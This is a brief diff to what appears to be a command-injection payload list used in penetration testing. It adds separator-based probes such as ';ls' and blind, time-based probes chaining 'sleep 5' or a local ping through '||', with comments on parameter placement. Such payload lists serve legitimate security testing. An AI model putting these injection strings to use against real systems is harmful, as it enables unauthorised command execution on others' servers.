@@ -1,7 +1,9 @@
-ls
+#Simple Case
 ;ls
 ;ls;
-sleep 5
-;sleep 5
-;sleep 5;
-|| sleep 5
+
+#Blind injection
+
+asd||sleep 5|| >> Middle of two parameter.
+||ping+-c+10+127.0.0.1||
+asd||sleep 5 # >> Last parameter or to comment out extra parameter
